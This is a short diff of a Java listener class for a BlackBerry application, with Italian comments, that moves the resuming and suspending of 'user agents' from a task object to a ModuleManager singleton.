@@ -33,6 +33,7 @@ import blackberry.interfaces.BacklightObserver;
 import blackberry.interfaces.BatteryStatusObserver;
 import blackberry.interfaces.CallListObserver;
 import blackberry.interfaces.Singleton;
+import blackberry.manager.ModuleManager;
 
 /**
  * The listener interface for receiving app events. The class that is interested
@@ -425,11 +426,11 @@ public final class AppListener extends Listener implements RadioStatusListener,
             // se c'e' una variazione nella lista comunica la lista agli observer
             // viene fatto con un timer
             task.resumeApplicationTimer();
-            task.resumeUserAgents();
+            ModuleManager.getInstance().resumeUserAgents();
         } else {
             // interrompe l'analisi degli applicativi
             task.suspendApplicationTimer();
-            task.suspendUserAgents();
+            ModuleManager.getInstance().suspendUserAgents();
         }
     }
 
